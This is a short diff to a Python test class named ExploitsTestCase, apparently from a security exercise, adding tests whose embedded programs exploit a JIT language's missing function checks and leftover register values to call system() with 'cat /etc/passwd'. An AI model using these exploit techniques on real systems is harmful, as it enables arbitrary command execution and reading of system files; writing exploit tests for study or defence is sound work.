@@ -174,8 +174,27 @@ class ExploitsTestCase(CompileTestCase):
         self.assertIn(b'root:x:0:0:root:/root:/bin/bash', output)
 
     def test_system_2(self):
-        # TODO find some helper gadget which allows us to load arbitrary strings to $rdi
-        pass
+        code = '''
+        // no function checks => we can call any symbol in any library. just the calling convention is an issue.
+        func jit_entrypoint() {
+            "cat /etc/passwd" == "cat /etc/passwd";  // jit_rt_equal leaves string pointers in $rdi if both sides are same length
+            system();
+        }
+        '''
+        output = self.run_prog(code)
+        print(output)
+        self.assertIn('root:x:0:0:root:/root:/bin/bash', output)
+
+        code = '''
+        // no function checks => we can call any symbol in any library. just the calling convention is an issue.
+        func jit_entrypoint() {
+            "cat /etc/passwd" < "xxx";  // jit_rt_lt sometimes leaves string pointers in $rdi
+            system();
+        }
+        '''
+        output = self.run_prog(code)
+        print(output)
+        self.assertIn('root:x:0:0:root:/root:/bin/bash', output)
 
     def test_nop_out_privacy_check(self):
         # we can override the libjit_rt symbol which determines a collection's privacy (DataStorage::isPublic).
